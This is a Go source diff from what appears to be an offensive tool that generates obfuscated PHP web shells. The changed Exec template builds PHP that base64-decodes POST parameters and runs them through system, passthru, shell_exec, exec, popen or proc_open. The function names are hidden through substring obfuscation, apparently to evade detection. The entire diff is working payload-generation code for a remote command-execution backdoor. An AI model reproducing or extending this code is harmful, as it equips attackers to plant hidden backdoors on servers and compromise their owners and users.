@@ -104,12 +104,12 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 	seps := NewSeparators()
 
 	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
-	sysR := obfuscatedFuncRefSubstr("system")
-	psR := obfuscatedFuncRefSubstr("passthru")
-	seR := obfuscatedFuncRefSubstr("shell_exec")
-	exR := obfuscatedFuncRefSubstr("exec")
-	poR := obfuscatedFuncRefSubstr("popen")
-	prR := obfuscatedFuncRefSubstr("proc_open")
+	sysSetup, sysR := obfuscatedFuncSubstr("system")
+	psSetup, psR := obfuscatedFuncSubstr("passthru")
+	seSetup, seR := obfuscatedFuncSubstr("shell_exec")
+	exSetup, exR := obfuscatedFuncSubstr("exec")
+	poSetup, poR := obfuscatedFuncSubstr("popen")
+	prSetup, prR := obfuscatedFuncSubstr("proc_open")
 
 	varP, varS := phpVar6(), phpVar6()
 	varEnv, varC := phpVar6(), phpVar6()
@@ -124,7 +124,7 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 	refs := []funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}
 
 	code := "" +
-		b64S + ";" + sysR + ";" + psR + ";" + seR + ";" + exR + ";" + poR + ";" + prR + ";" +
+		b64S + ";" + sysSetup + ";" + psSetup + ";" + seSetup + ";" + exSetup + ";" + poSetup + ";" + prSetup + ";" +
 		"$" + varP + "=" + b64R + "((isset($_POST['" + v[0] + "']))?$_POST['" + v[0] + "']:'');" +
 		"$" + varS + "=" + b64R + "((isset($_POST['" + v[1] + "']))?$_POST['" + v[1] + "']:'');" +
 		"$" + varEnv + "=@" + b64R + "((isset($_POST['" + v[2] + "']))?$_POST['" + v[2] + "']:'');" +
